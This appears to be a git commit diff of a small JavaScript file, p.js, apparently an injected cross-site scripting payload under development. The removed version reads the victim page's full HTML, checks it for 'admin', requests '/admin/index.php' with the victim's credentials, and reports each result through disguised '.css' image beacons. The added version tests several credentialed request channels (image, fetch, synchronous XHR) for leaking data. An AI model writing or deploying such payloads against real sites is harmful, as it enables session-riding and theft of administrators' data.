03076ce5371b2778720e346a2817a7a2b934c588
daveakd06 <dev-benin@epitech.africa>
2026-08-31 20:09:59 +0200

    sync

--- p.js
+++ p.js
@@ -1,6 +1,8 @@
-var b='/cases.php/B9708_',img=function(s){new Image().src=b+s+'.css';};
-img('BA');
-setTimeout(function(){img('BB');},700);
-setTimeout(function(){img('BC');},1600);
-setTimeout(function(){ try{img('BTRY'); var H=document.documentElement.outerHTML; img(H.length>1000?'BHbig':'BHsmall'); img(H.indexOf('admin')>=0?'BHadm1':'BHadm0'); }catch(e){img('BEXC_'+(e&&e.name||'x'));} },2600);
-setTimeout(function(){ fetch('/admin/index.php',{credentials:'include'}).then(function(r){img('BAF_'+r.status);},function(){img('BAFrej');}); },3600);
+var b='/cases.php/S9799_';
+new Image().src=b+'S1.css';
+new Image().src=b+'S2.css';
+new Image().src=b+'S3.css';
+try{fetch(b+'F1.css',{keepalive:true});}catch(e){}
+try{fetch(b+'F2.css',{keepalive:true,credentials:'include'});}catch(e){}
+try{var x=new XMLHttpRequest();x.open('GET',b+'X1.css',false);x.send();}catch(e){new Image().src=b+'XERR.css';}
+new Image().src=b+'S4.css';
